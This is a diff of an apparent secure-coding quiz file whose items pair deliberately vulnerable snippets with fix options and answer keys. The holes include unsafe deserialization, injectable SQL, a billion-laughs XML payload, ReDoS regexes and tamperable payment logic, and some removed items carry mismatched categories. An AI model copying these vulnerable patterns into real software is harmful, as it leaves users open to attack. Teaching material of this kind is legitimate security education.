+        explanation: 'MFA must be a blocking step in a single, unified authentication flow. An initial login success should only grant a temporary status that is not fully authenticated. Full access is only granted after the second factor is successfully verified.',
+    },
+    {
+        id: '54',
+        title: 'Insecure Object Serialization (Java/.NET)',
+        category: 'Insecure Deserialization',
+        difficulty: 'Advanced',
+        xp: 85,
+        description: 'A Java application deserializes an object from an untrusted source, which can be exploited for Remote Code Execution (RCE) using gadget chains.',
+        vulnerableCode: `// Java
+// Attacker sends a malicious serialized object.
+public Object process(InputStream untrustedStream) throws Exception {
+    ObjectInputStream in = new ObjectInputStream(untrustedStream);
+    return in.readObject(); // Vulnerable
+}`,
+        language: 'java',
+        options: [
+            {
+                id: '54a',
+                code: `// Use a "look-ahead" deserialization library that validates the class types in the stream before they are instantiated.`
+            },
+            {
+                id: '54b',
+                code: `// Avoid native Java serialization. Use a safe, data-only format like JSON with a library like Jackson or GSON.`
+            },
+            {
+                id: '54c',
+                code: `Both A and B are valid strategies, but B is generally the safest and most recommended approach for modern applications.`
+            },
+        ],
+        correctOptionId: '54c',
+        explanation: 'Native Java serialization is notoriously unsafe. While look-ahead validation (A) can mitigate the risk, the most robust and modern solution is to avoid it entirely and use a safe format like JSON for data exchange (B).',
+    },
+    {
+        id: '55',
+        title: 'Unsafe Use of Third-Party Libraries (Supply Chain)',
+        category: 'Supply Chain',
+        difficulty: 'Expert',
+        xp: 100,
+        description: 'An application uses a third-party library with a known, critical vulnerability.',
+        vulnerableCode: `// package.json
+{
+  "dependencies": {
+    "left-pad": "0.0.1", // An old, hypothetical vulnerable version
+    "some-other-lib": "1.2.3"
   }
 }`,
         language: 'javascript',
         options: [
-            { id: '14a', code: `// Add a check to prevent modification of __proto__
-for (let key in source) {
-    if (key === '__proto__') {
-        continue;
-    }
-    // ... rest of the logic
-}` },
-            { id: '14b', code: `// Use Object.freeze on Object.prototype at the start of the application.
-Object.freeze(Object.prototype);` },
-            { id: '14c', code: 'Both A and B are valid and recommended mitigation strategies.' }
+            {
+                id: '55a',
+                code: `// Regularly scan dependencies for known vulnerabilities using tools like 'npm audit', 'Snyk', or 'GitHub Dependabot'.
+// Update vulnerable packages to a safe, patched version.`
+            },
+            {
+                id: '55b',
+                code: `// Write your own version of the library to avoid the dependency.`
+            },
+            {
+                id: '55c',
+                code: `// Use a firewall to block exploits targeting the library.`
+            },
         ],
-        correctOptionId: '14c',
-        explanation: 'Prototype Pollution is dangerous. Blacklisting keys like `__proto__` during merges helps prevent it, but freezing `Object.prototype` provides a more robust, application-wide defense against any accidental or malicious modifications.',
+        correctOptionId: '55a',
+        explanation: 'Supply chain security is critical. You must have an automated process to continuously scan your project\'s dependencies for known vulnerabilities and have a plan to update or replace them promptly when a security issue is discovered.',
     },
     {
-        id: '15',
-        title: 'Timing Attack',
-        category: 'IDOR',
+        id: '56',
+        title: 'Cross-Origin Resource Leak (CORS Preflight Abuse)',
+        category: 'CORS',
         difficulty: 'Advanced',
         xp: 75,
-        description: 'String comparison is not constant-time, allowing an attacker to guess a secret (like a token) character by character by measuring server response times.',
-        vulnerableCode: `// Python
-def check_token(user_token, secret_token):
-    if len(user_token) != len(secret_token):
-        return False
-    for i in range(len(user_token)):
-        if user_token[i] != secret_token[i]:
-            return False
-    return True`,
-        language: 'python',
-        options: [
-            { id: '15a', code: `// Use a constant-time comparison function.
-import hmac
-def check_token(user_token, secret_token):
-    return hmac.compare_digest(user_token, secret_token)` },
-            { id: '15b', code: `// Hash the tokens before comparing them.
-import hashlib
-def check_token(user_token, secret_token):
-    return hashlib.sha256(user_token).hexdigest() == hashlib.sha256(secret_token).hexdigest()` },
-            { id: '15c', code: `def check_token(user_token, secret_token):
-    return user_token == secret_token` }
-        ],
-        correctOptionId: '15a',
-        explanation: 'Normal string comparison (`==`) short-circuits, returning `False` as soon as a difference is found. This timing difference can be exploited. Cryptographic libraries provide constant-time comparison functions (like `hmac.compare_digest`) that take the same amount of time regardless of where the strings differ.',
-    },
-    {
-        id: '16',
-        title: 'Insecure Randomness',
-        category: 'CSRF',
-        difficulty: 'Intermediate',
-        xp: 55,
-        description: 'A predictable random number generator is used for a security-sensitive purpose, like generating a password reset token.',
-        vulnerableCode: `// JavaScript (Node.js)
-function generateResetToken() {
-    // Math.random() is not cryptographically secure
-    return Math.floor(Math.random() * 1000000).toString();
-}`,
+        description: 'A server responds to an `OPTIONS` preflight request with permissive headers, but the actual `POST` request handler does not properly validate the request.',
+        vulnerableCode: `// JavaScript (Node.js/Express)
+// Preflight handler is too permissive
+app.options('/api/sensitive', cors({ origin: 'https://partner.com' }));
+
+// Actual POST handler has no CORS check, allowing any origin
+app.post('/api/sensitive', (req, res) => {
+  // ... do sensitive stuff
+});`,
         language: 'javascript',
         options: [
-            { id: '16a', code: `// Use the built-in crypto module for generating secure random numbers.
-import { randomBytes } from 'crypto';
-function generateResetToken() {
-    return randomBytes(16).toString('hex');
-}` },
-            { id: '16b', code: `// Seed the random number generator with the current time.
-function generateResetToken() {
-    const seed = new Date().getTime();
-    return Math.floor(Math.random(seed) * 1000000).toString();
-}` },
-            { id: '16c', code: `// Generate a more complex token using Math.random().
-function generateResetToken() {
-    return Math.random().toString(36).substring(2);
-}` }
+            {
+                id: '56a',
+                code: `// The CORS middleware must be applied to the actual route, not just the OPTIONS handler.
+// This ensures the check is performed for all request methods.
+const corsOptions = { origin: 'https://partner.com' };
+app.options('/api/sensitive', cors(corsOptions)); // For preflight
+app.post('/api/sensitive', cors(corsOptions), (req, res) => { /*...*/ }); // For actual request`
+            },
+            {
+                id: '56b',
+                code: `// Block all OPTIONS requests.`
+            },
+            {
+                id: '56c',
+                code: `// Check the Origin header manually inside the POST handler.`
+            },
         ],
-        correctOptionId: '16a',
-        explanation: 'For any security purpose (session IDs, tokens, etc.), you must use a cryptographically secure pseudorandom number generator (CSPRNG). Most languages provide one in their standard library (e.g., `crypto` in Node.js, `secrets` in Python).',
+        correctOptionId: '56a',
+        explanation: 'CORS checks must be enforced on the actual request (e.g., POST, PUT), not just the preflight (OPTIONS) request. A common mistake is to have a permissive preflight response but fail to validate the `Origin` header on the subsequent request.',
     },
     {
-        id: '17',
-        title: 'Clickjacking',
-        category: 'CSRF',
-        difficulty: 'Intermediate',
-        xp: 50,
-        description: 'A web page can be embedded in a malicious iframe, tricking a user into clicking on something they didn\'t intend to.',
-        vulnerableCode: `// No specific code, this is a configuration issue.
-// The web server does not set any anti-clickjacking headers.`,
-        language: 'javascript',
-        options: [
-            { id: '17a', code: `// Set the X-Frame-Options header on the server response.
-// This prevents the page from being embedded in iframes on other domains.
-response.setHeader('X-Frame-Options', 'SAMEORIGIN');` },
-            { id: '17b', code: `// Use JavaScript to detect if the page is in an iframe and break out.
-if (window.top !== window.self) {
-    window.top.location = window.self.location;
-}` },
-            { id: '17c', code: 'Both A and B are valid, but A is the modern and preferred method.' }
-        ],
-        correctOptionId: '17c',
-        explanation: 'The `X-Frame-Options` HTTP header is the most effective defense against clickjacking. While the JavaScript frame-busting script (Option B) can work, it can sometimes be bypassed. Using the HTTP header is the standard and most reliable solution.',
-    },
-    {
-        id: '18',
-        title: 'Insecure File Upload',
-        category: 'IDOR',
+        id: '57',
+        title: 'Misconfigured Content Security Policy (CSP) Bypass',
+        category: 'XSS / CSP',
         difficulty: 'Advanced',
         xp: 80,
-        description: 'A file upload endpoint does not properly validate the file type or name, allowing an attacker to upload a web shell or other malicious file.',
-        vulnerableCode: `// PHP
-$target_dir = "uploads/";
-$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
-move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);`,
-        language: 'php',
+        description: 'A Content Security Policy (CSP) is in place, but it includes `unsafe-inline` or a too-permissive source, allowing it to be bypassed.',
+        vulnerableCode: `// HTTP Response Header
+Content-Security-Policy: script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com;`,
+        language: 'generic',
         options: [
-            { id: '18a', code: `// Validate file extension against a whitelist.
-$allowed_types = ['jpg', 'png', 'gif'];
-$ext = pathinfo($_FILES["fileToUpload"]["name"], PATHINFO_EXTENSION);
-if (!in_array($ext, $allowed_types)) {
-    // reject file
-}` },
-            { id: '18b', code: `// Generate a new, random filename for the uploaded file.
-$ext = pathinfo($_FILES["fileToUpload"]["name"], PATHINFO_EXTENSION);
-$new_name = bin2hex(random_bytes(16)) . '.' . $ext;
-$target_file = $target_dir . $new_name;
-move_uploaded_file(...)` },
-            { id: '18c', code: 'Both A and B are essential parts of a secure file upload mechanism.' }
+            {
+                id: '57a',
+                code: `// Remove 'unsafe-inline'. Refactor any inline scripts to be in separate .js files served from the same origin.
+// Tightly scope the allowed domains.
+Content-Security-Policy: script-src 'self' https://trusted.cdn.com;`
+            },
+            {
+                id: '57b',
+                code: `// Add a 'nonce' to the policy and to each legitimate inline script tag.
+// CSP: script-src 'self' 'nonce-rAnd0m';
+// HTML: <script nonce="rAnd0m">...</script>`
+            },
+            {
+                id: '57c',
+                code: 'Both A and B are valid strategies for strengthening a weak CSP.'
+            },
         ],
-        correctOptionId: '18c',
-        explanation: 'A secure file upload requires multiple layers of defense. You must validate the file type based on a strict whitelist (Option A), and you should never trust the user-provided filename. Generating a new, random filename (Option B) prevents path traversal and other attacks.',
+        correctOptionId: '57c',
+        explanation: '`unsafe-inline` effectively negates many of the benefits of CSP. The best practice is to move all inline scripts to external files (A). If inline scripts are absolutely necessary, you must use a nonce or hash-based approach to whitelist them individually (B).',
     },
     {
-        id: '19',
-        title: 'Broken Authentication - Weak Password Policy',
-        category: 'CSRF',
-        difficulty: 'Beginner',
-        xp: 45,
-        description: 'The application allows users to set extremely simple and short passwords.',
-        vulnerableCode: `// JavaScript
-function isPasswordValid(password) {
-    return password.length > 0;
-}`,
-        language: 'javascript',
-        options: [
-            { id: '19a', code: `// Enforce minimum length and complexity requirements.
-function isPasswordValid(password) {
-    const hasUpperCase = /[A-Z]/.test(password);
-    const hasLowerCase = /[a-z]/.test(password);
-    const hasNumbers = /\\d/.test(password);
-    return password.length >= 8 && hasUpperCase && hasLowerCase && hasNumbers;
-}` },
-            { id: '19b', code: `// Check the password against a dictionary of common passwords.` },
-            { id: '19c', code: `// Both A and B are important for a strong password policy.
-// In a real application, you'd also want to use a service like Have I Been Pwned.` }
-        ],
-        correctOptionId: '19c',
-        explanation: 'A strong password policy is multi-faceted. It requires enforcing complexity and length rules (A) and checking against lists of known compromised or common passwords (B).',
-    },
-    {
-        id: '20',
-        title: 'Missing `HttpOnly` Cookie Flag',
-        category: 'XSS',
-        difficulty: 'Intermediate',
-        xp: 55,
-        description: 'A session cookie is set without the `HttpOnly` flag, making it accessible to client-side JavaScript and vulnerable to theft via XSS.',
-        vulnerableCode: `// JavaScript (Node.js/Express)
-res.cookie('sessionId', '...some-secret-value...');`,
-        language: 'javascript',
-        options: [
-            { id: '20a', code: `// Add the HttpOnly and Secure flags to the cookie.
-res.cookie('sessionId', '...some-secret-value...', {
-    httpOnly: true, // Prevents JS access
-    secure: true    // Ensures cookie is sent only over HTTPS
-});` },
-            { id: '20b', code: `// Encrypt the cookie value before sending it to the client.` },
-            { id: '20c', code: `// Store the session ID in localStorage instead of a cookie.` }
-        ],
-        correctOptionId: '20a',
-        explanation: 'The `HttpOnly` flag is a critical security measure that tells the browser to prevent client-side scripts from accessing the cookie. This makes it impossible for an XSS attack to steal the session cookie.',
-    },
-    {
-        id: '21',
-        title: 'Regular Expression Denial of Service (ReDoS)',
-        category: 'IDOR',
-        difficulty: 'Advanced',
-        xp: 85,
-        description: 'A poorly written regular expression can take an extremely long time to process certain inputs, leading to a denial of service.',
-        vulnerableCode: `// JavaScript
-// The regex (a+)+ is vulnerable to "catastrophic backtracking".
-const regex = new RegExp('(a+)+$');
-regex.test('aaaaaaaaaaaaaaaaaaaaaaaaa!'); // Malicious input`,
-        language: 'javascript',
-        options: [
-            { id: '21a', code: `// Rewrite the regex to avoid nested quantifiers and backtracking.
-const regex = new RegExp('a+$');` },
-            { id: '21b', code: `// Set a timeout on the regex execution.
-// (Note: JavaScript does not have a built-in regex timeout).` },
-            { id: '21c', code: 'Both A and B are valid approaches, but A is the most direct fix.' }
-        ],
-        correctOptionId: '21a',
-        explanation: 'The vulnerability comes from nested quantifiers (`(a+)+`) which create an exponential number of paths for the regex engine to try on certain inputs. Rewriting the regex to be more specific and avoid this "catastrophic backtracking" is the correct solution.',
-    },
-    {
-        id: '22',
-        title: 'Insecure Content-Type Header',
-        category: 'XSS',
-        difficulty: 'Intermediate',
-        xp: 50,
-        description: 'An API endpoint returns JSON but sets the Content-Type header to `text/html`, which could cause browsers to misinterpret the content and lead to XSS.',
-        vulnerableCode: `// PHP
-header('Content-Type: text/html');
-echo '{"message": "<script>alert(1)</script>"}';`,
-        language: 'php',
-        options: [
-            { id: '22a', code: `// Set the correct Content-Type for JSON responses.
-header('Content-Type: application/json');
-echo '{"message": "..."}';` },
-            { id: '22b', code: `// Also add the 'X-Content-Type-Options: nosniff' header.
-header('Content-Type: application/json');
-header('X-Content-Type-Options: nosniff');
-echo '{"message": "..."}';` },
-            { id: '22c', code: `// Escape the HTML within the JSON string.
-header('Content-Type: text/html');
-echo '{"message": "&lt;script&gt;...&lt;/script&gt;"}';` }
-        ],
-        correctOptionId: '22b',
-        explanation: 'Setting the correct `Content-Type: application/json` is crucial. Additionally, the `X-Content-Type-Options: nosniff` header prevents browsers from trying to guess the content type, adding another layer of defense against content sniffing attacks.',
-    },
-    {
-        id: '23',
-        title: 'Improper Asset Management',
-        category: 'IDOR',
-        difficulty: 'Beginner',
-        xp: 40,
-        description: 'Sensitive files, such as `.git` directories or configuration files like `.env`, are publicly accessible on the web server.',
-        vulnerableCode: `// Web Server Configuration (e.g., Nginx)
-server {
-    listen 80;
-    server_name example.com;
-    root /var/www/html;
-    
-    # All files in the root are served by default.
-    # Attacker can access http://example.com/.git/config
-}`,
-        language: 'javascript', // Using JS as a placeholder for config files
-        options: [
-            { id: '23a', code: `// Configure the web server to deny access to sensitive files and directories.
-location ~ /\\.git {
-    deny all;
-}
-location ~ /\\.env {
-    deny all;
-}` },
-            { id: '23b', code: `// Use a robots.txt file to tell search engines not to index these files.` },
-            { id: '23c', code: `// Rename the .git directory to something else.` }
-        ],
-        correctOptionId: '23a',
-        explanation: 'The only secure way to protect sensitive files is to configure the web server to explicitly deny all requests for them. `robots.txt` only prevents well-behaved bots, not attackers, and renaming files is just security by obscurity.',
-    },
-    {
-        id: '24',
-        title: 'Missing `rel="noopener"`',
-        category: 'IDOR',
-        difficulty: 'Intermediate',
-        xp: 45,
-        description: 'A link with `target="_blank"` is missing `rel="noopener"`, allowing the newly opened page to potentially control the original page via the `window.opener` object.',
-        vulnerableCode: `<a href="https://example.com" target="_blank">Visit Example</a>`,
-        language: 'javascript', // HTML fits best here
-        options: [
-            { id: '24a', code: `<a href="..." target="_blank" rel="noopener noreferrer">Visit Example</a>` },
-            { id: '24b', code: `// Use JavaScript to open the window instead.
-window.open("https://example.com");` },
-            { id: '24c', code: `// This is not a real vulnerability in modern browsers.` }
-        ],
-        correctOptionId: '24a',
-        explanation: 'To prevent the new page from accessing `window.opener`, you must add `rel="noopener"` to any link that uses `target="_blank"`. Adding `noreferrer` is also good practice as it prevents the new page from knowing where the user came from.',
-    },
-    {
-        id: '25',
-        title: 'Cleartext Submission of Password',
-        category: 'CSRF',
-        difficulty: 'Beginner',
-        xp: 45,
-        description: 'A login form is submitted over HTTP, not HTTPS. An attacker on the same network could sniff the password.',
-        vulnerableCode: `<form action="http://example.com/login" method="post">
-    <input type="password" name="password">
-</form>`,
-        language: 'javascript',
-        options: [
-            { id: '25a', code: `// Use client-side JavaScript to hash the password before sending.` },
-            { id: '25b', code: `// Use HTTPS for the entire site, including the form action.
-<form action="https://example.com/login" method="post">` },
-            { id: '25c', code: `// Use the POST method instead of GET.` }
-        ],
-        correctOptionId: '25b',
-        explanation: 'The only way to protect data in transit is to use TLS (HTTPS). This encrypts the entire HTTP request, including headers and body, preventing eavesdropping. Client-side hashing is not a substitute for TLS.',
-    },
-    {
-        id: '26',
-        title: 'Deserialization of Untrusted Data (PHP)',
-        category: 'SQL Injection',
-        difficulty: 'Advanced',
-        xp: 90,
-        description: 'The `unserialize()` function in PHP is used on user-provided data from a cookie, which can lead to object injection and remote code execution.',
-        vulnerableCode: `// PHP
-$user_data = unserialize($_COOKIE['user_data']);`,
-        language: 'php',
-        options: [
-            { id: '26a', code: `// Never unserialize untrusted data. Use JSON for data exchange.
-$user_data = json_decode($_COOKIE['user_data'], true);` },
-            { id: '26b', code: `// Base64 encode the data to make it safe.
-$user_data = unserialize(base64_decode($_COOKIE['user_data']));` },
-            { id: '26c', code: `// Check for bad characters before unserializing.
-if (strpos($_COOKIE['user_data'], 'O:') === false) {
-    $user_data = unserialize($_COOKIE['user_data']);
-}` }
-        ],
-        correctOptionId: '26a',
-        explanation: 'PHP object deserialization is extremely dangerous when used on untrusted input. The safest alternative is to use a simple, serialization-safe format like JSON.',
-    },
-    {
-        id: '27',
-        title: 'Open Redirect',
-        category: 'IDOR',
-        difficulty: 'Intermediate',
-        xp: 60,
-        description: 'An application redirects to a user-controlled URL without proper validation.',
-        vulnerableCode: `// Python (Flask)
-from flask import request, redirect
-@app.route('/redirect')
-def do_redirect():
-    url = request.args.get('url')
-    return redirect(url)`,
-        language: 'python',
-        options: [
-            { id: '27a', code: `// Whitelist the allowed domains.
-from urllib.parse import urlparse
-def do_redirect():
-    url = request.args.get('url')
-    parsed_url = urlparse(url)
-    if parsed_url.hostname in ['example.com', 'trusted.com']:
-        return redirect(url)
-    return "Invalid redirect"` },
-            { id: '27b', code: `// Check if the URL starts with a slash.
-def do_redirect():
-    url = request.args.get('url')
-    if url.startswith('/'):
-        return redirect(url)
-    return "Invalid redirect"` },
-            { id: '27c', code: 'A and B are both good strategies that should be used together.' }
-        ],
-        correctOptionId: '27c',
-        explanation: 'A robust defense against open redirects involves multiple checks. You should validate that the URL is on an allow-list of domains (A) OR that it is a local redirect (B). Combining these provides strong protection.',
-    },
-    {
-        id: '28',
-        title: 'Missing Content Security Policy (CSP)',
-        category: 'XSS',
-        difficulty: 'Advanced',
-        xp: 70,
-        description: 'The website does not send a Content-Security-Policy header, leaving it more vulnerable to XSS attacks by allowing scripts from any source.',
-        vulnerableCode: `// This is a server configuration issue, not code in a file.
-// The server sends no CSP header.`,
-        language: 'javascript',
-        options: [
-            { id: '28a', code: `// Add a strict Content-Security-Policy header to the server response.
-// This example only allows scripts from the same origin.
-Content-Security-Policy: script-src 'self';` },
-            { id: '28b', code: `// Set a policy that blocks all scripts.
-Content-Security-Policy: script-src 'none';` },
-            { id: '28c', code: `// Use a JavaScript library to manually check script tags before they load.` }
-        ],
-        correctOptionId: '28a',
-        explanation: 'CSP is a powerful browser-level defense that gives you fine-grained control over what resources (scripts, styles, images) are allowed to load. A strict policy that whitelists trusted sources is a crucial layer of defense against XSS.',
-    },
-    {
-        id: '29',
-        title: 'Use of Hardcoded Credentials',
-        category: 'CSRF',
-        difficulty: 'Beginner',
-        xp: 45,
-        description: 'A secret key or password is hardcoded directly in the source code, making it visible to anyone who has access to the code.',
-        vulnerableCode: `// Java
-String dbPassword = "MySuperSecretPassword123!";
-Connection conn = DriverManager.getConnection(DB_URL, "user", dbPassword);`,
-        language: 'java',
-        options: [
-            { id: '29a', code: `// Store secrets in environment variables or a secure secret management system.
-String dbPassword = System.getenv("DB_PASSWORD");
-Connection conn = ...` },
-            { id: '29b', code: `// Obfuscate the password in the code.
-String dbPassword = new String(Base64.getDecoder().decode("TXlTdXBl..."));` },
-            { id: '29c', code: `// Store the password in a separate configuration file.` }
-        ],
-        correctOptionId: '29a',
-        explanation: 'Hardcoding secrets is a major security risk. The industry standard is to externalize configuration and secrets. They should be injected into the application at runtime via environment variables or a dedicated secrets management service (like HashiCorp Vault or AWS Secrets Manager).',
-    },
-    {
-        id: '30',
-        title: 'Broken Access Control - Missing Role Check',
-        category: 'IDOR',
-        difficulty: 'Intermediate',
-        xp: 60,
-        description: 'An endpoint for administrative functions checks if a user is logged in, but fails to check if they have the `admin` role.',
-        vulnerableCode: `// JavaScript (Node.js/Express Middleware)
-function ensureAuthenticated(req, res, next) {
-    if (req.isAuthenticated()) {
-        return next();
-    }
-    res.redirect('/login');
-}
-app.get('/admin', ensureAuthenticated, (req, res) => { /* admin stuff */ });`,
-        language: 'javascript',
-        options: [
-            { id: '30a', code: `// Create a separate middleware to check for the admin role.
-function ensureAdmin(req, res, next) {
-    if (req.user && req.user.role === 'admin') {
-        return next();
-    }
-    res.status(403).send('Forbidden');
-}
-app.get('/admin', ensureAuthenticated, ensureAdmin, (req, res) => { /* ... */ });` },
-            { id: '30b', code: `// Obfuscate the admin URL.
-app.get('/admin-asjdfh32r9y', ensureAuthenticated, ...);` },
-            { id: '30c', code: `// Add a check inside the route handler.
-app.get('/admin', ensureAuthenticated, (req, res) => {
-    if (req.user.role === 'admin') { /* admin stuff */ }
-    else { res.status(403); }
-});` }
-        ],
-        correctOptionId: '30a',
-        explanation: 'Authentication (who you are) and authorization (what you can do) are separate concerns. Using dedicated middleware for role checks makes the authorization logic clear, reusable, and less prone to errors.',
-    },
-    {
-        id: '31',
-        title: 'Blind SQL Injection',
-        category: 'SQL Injection',
+        id: '58',
+        title: 'Business Logic Flaw (Credit Manipulation)',
+        category: 'Business Logic',
         difficulty: 'Expert',
         xp: 95,
-        description: 'The application does not return data from the database, but a query vulnerability can be exploited based on whether the query returns true or false (e.g., by observing a time delay).',
-        vulnerableCode: `// PHP
-$id = $_GET['id'];
-$query = "SELECT id FROM articles WHERE id = $id AND published = 1";
-$result = mysqli_query($conn, $query);
-if (mysqli_num_rows($result) > 0) {
-    // Show article
-} else {
-    // Show "not found"
-}`,
-        language: 'php',
-        options: [
-            { id: '31a', code: `// Even when not displaying data, always use parameterized queries.
-$id = $_GET['id'];
-$stmt = $conn->prepare("SELECT id FROM articles WHERE id = ? AND published = 1");
-$stmt->bind_param("s", $id);
-$stmt->execute();` },
-            { id: '31b', code: `// Cast the input to an integer to prevent string manipulation.
-$id = (int)$_GET['id'];
-$query = "SELECT id FROM articles WHERE id = $id AND published = 1";` },
-            { id: '31c', code: `// Add a sleep function to normalize response times.
-sleep(1);
-// ... proceed with query` }
-        ],
-        correctOptionId: '31a',
-        explanation: 'The vulnerability is still SQL injection, even if it is "blind". The defense is the same: use parameterized queries to separate code from data. This prevents the user input from being interpreted as part of the SQL command, regardless of what the application does with the query result.',
-    },
-    {
-        id: '32',
-        title: 'XML Bomb (Billion Laughs Attack)',
-        category: 'IDOR',
-        difficulty: 'Advanced',
-        xp: 80,
-        description: 'An XML parser that expands entities can be tricked into consuming huge amounts of memory by parsing a small XML file with nested entities.',
-        vulnerableCode: `<!-- A malicious XML input -->
-<!DOCTYPE lolz [
-  <!ENTITY lol "lol">
-  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
-  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
-  ...and so on...
-]>
-<lolz>&lol9;</lolz>`,
-        language: 'javascript', // XML
-        options: [
-            { id: '32a', code: `// Set limits on the XML parser for entity expansion.
-// For example, in Java's DocumentBuilderFactory:
-factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
-factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");` },
-            { id: '32b', code: `// Completely disable DTDs (Document Type Definitions) in the XML parser.
-factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);` },
-            { id: '32c', code: `// Limit the file size of the uploaded XML.` }
-        ],
-        correctOptionId: '32b',
-        explanation: 'While other options can help, the most effective way to prevent entity-based attacks like the "Billion Laughs" attack is to completely disable the processing of DTDs, which is where entities are defined.',
-    },
-    {
-        id: '33',
-        title: 'Session Fixation',
-        category: 'CSRF',
-        difficulty: 'Advanced',
-        xp: 70,
-        description: 'An attacker tricks a user into using a session ID known to the attacker. After the user logs in, the attacker can use the same session ID to impersonate the user.',
-        vulnerableCode: `// Web framework logic
-// 1. User visits http://example.com?sessionId=ATTACKER_ID
-// 2. Application uses this session ID.
-// 3. User logs in.
-// 4. Attacker can now use sessionId=ATTACKER_ID to access the logged-in session.`,
+        description: 'An endpoint for transferring credits from one user to another doesn\'t prevent a user from transferring a negative amount.',
+        vulnerableCode: `// JavaScript (API Endpoint)
+app.post('/transfer', (req, res) => {
+  const { toUserId, amount } = req.body;
+  const fromUser = req.user;
+
+  // Attacker sends: { toUserId: 'victim', amount: -1000 }
+  // This effectively STEALS credits from the victim.
+  fromUser.credits += amount;
+  const toUser = db.findUser(toUserId);
+  toUser.credits -= amount;
+
+  res.send("Transfer successful");
+});`,
         language: 'javascript',
         options: [
-            { id: '33a', code: `// Regenerate the session ID immediately after a successful login.
-// Most modern web frameworks do this automatically.
-session.regenerate();` },
-            { id: '33b', code: `// Do not accept session IDs from query parameters.` },
-            { id: '33c', code: 'Both A and B are crucial for preventing session fixation.' }
+            {
+                id: '58a',
+                code: `// Add server-side validation to ensure the transfer amount is a positive number.
+if (amount <= 0) {
+  return res.status(400).send("Invalid amount");
+}`
+            },
+            {
+                id: '58b',
+                code: `// Use an unsigned integer type for the 'amount' in the database.`
+            },
+            {
+                id: '58c',
+                code: `// Check that the 'fromUser' has sufficient credits for the transfer.`
+            },
         ],
-        correctOptionId: '33c',
-        explanation: 'The primary defense is to create a completely new session ID after a privilege level change, such as logging in (A). Additionally, session IDs should never be accepted from URL parameters, only from secure cookies (B).',
+        correctOptionId: '58a',
+        explanation: 'Business logic flaws occur when the application behaves correctly from a technical standpoint but allows for unintended, harmful user actions. The server must always validate that user inputs make sense in the context of the business rule, such as ensuring a transfer amount is positive.',
     },
     {
-        id: '34',
-        title: 'Mass Assignment',
-        category: 'IDOR',
-        difficulty: 'Intermediate',
-        xp: 65,
-        description: 'A web framework allows binding HTTP request parameters directly to object properties. An attacker sends extra parameters (e.g., `isAdmin=true`) to escalate privileges.',
-        vulnerableCode: `// A vulnerable controller in a framework like Ruby on Rails
-def update
-  @user = User.find(params[:id])
-  // params[:user] could contain {'name': 'eve', 'isAdmin': 'true'}
-  if @user.update(params[:user])
-    # ...
-  end
-end`,
-        language: 'python', // Ruby
+        id: '59',
+        title: 'Insecure Payment Flow / Tampered Prices',
+        category: 'Business Logic',
+        difficulty: 'Advanced',
+        xp: 85,
+        description: 'The price of an item is sent from the client to the server during checkout, allowing an attacker to tamper with it.',
+        vulnerableCode: `// JavaScript (Client-side)
+function checkout() {
+    const price = document.getElementById('price').textContent;
+    const itemId = 'prod_123';
+    // Attacker can modify 'price' in their browser before sending.
+    fetch('/api/charge', { method: 'POST', body: { itemId, price } });
+}`,
+        language: 'javascript',
         options: [
-            { id: '34a', code: `// Use a "strong parameters" or "whitelist" approach to only allow specific fields to be updated from the request.
-def user_params
-  params.require(:user).permit(:name, :email) # but not :isAdmin
-end
-
-if @user.update(user_params) ...` },
-            { id: '34b', code: `// Set sensitive properties like 'isAdmin' as read-only in the model.` },
-            { id: '34c', code: 'Both A and B are effective strategies.' }
+            {
+                id: '59a',
+                code: `// The server must NOT trust the price sent from the client.
+// It should re-fetch the item's price from its own database using the item ID.
+app.post('/api/charge', (req, res) => {
+    const { itemId } = req.body;
+    const item = db.products.find(itemId);
+    const price = item.price; // Get authoritative price from DB.
+    // ... create charge with the correct price ...
+});`
+            },
+            {
+                id: '59b',
+                code: `// Encrypt the price on the client before sending it.`
+            },
+            {
+                id: '59c',
+                code: `// Validate that the price is a positive number on the server.`
+            },
         ],
-        correctOptionId: '34c',
-        explanation: 'Mass assignment vulnerabilities are best solved by using an allow-list (`permit` in this Rails example) to specify exactly which attributes are updatable from user input (A). Making sensitive model attributes read-only (B) provides an additional layer of defense.',
+        correctOptionId: '59a',
+        explanation: 'Never trust the client. Any security-sensitive data, especially price, must be authoritatively determined by the server. The client should only send non-sensitive identifiers (like an item ID), and the server should look up the corresponding price.',
+    },
+    {
+        id: '60',
+        title: 'API Rate-Limit Bypass / Abuse',
+        category: 'DoS / Abuse',
+        difficulty: 'Advanced',
+        xp: 80,
+        description: 'An API has a rate limit, but it can be bypassed by spoofing the identifier used for tracking, such as the `X-Forwarded-For` header or a user ID.',
+        vulnerableCode: `// JavaScript (Node.js/Express)
+// Rate limiter uses a header that the user can control.
+const rateLimit = require('express-rate-limit');
+const limiter = rateLimit({
+    windowMs: 15 * 60 * 1000,
+    max: 100,
+    keyGenerator: (req) => req.headers['x-forwarded-for'] || req.ip
+});`,
+        language: 'javascript',
+        options: [
+            {
+                id: '60a',
+                code: `// The primary identifier for rate limiting should be something the user cannot control, such as the true source IP address or, for authenticated routes, the user's session ID or API key.
+const limiter = rateLimit({
+    // ...
+    keyGenerator: (req) => req.user.id || req.ip
+});`
+            },
+            {
+                id: '60b',
+                code: `// Use a lower max value for the rate limit.`
+            },
+            {
+                id: '60c',
+                code: `// Ban IP addresses that exceed the rate limit.`
+            },
+        ],
+        correctOptionId: '60a',
+        explanation: 'The effectiveness of a rate limit depends entirely on the identifier used to track requests. This identifier must be reliable and not user-configurable. For authenticated users, their user ID or API key is best. For anonymous users, the source IP address is the most common (though imperfect) identifier.',
+    },
+    {
+        id: '61',
+        title: 'Privileged Endpoint Exposure (Admin API)',
+        category: 'Broken Access Control',
+        difficulty: 'Expert',
+        xp: 95,
+        description: 'An internal or admin-only API endpoint is accidentally exposed to the public internet without proper firewall rules or authentication.',
+        vulnerableCode: `// A microservice for admin tasks is deployed to a public subnet.
+// It has no authentication configured, assuming it will only be called by other internal services.
+// e.g., http://admin-service.public.cloud/reset-all-passwords`,
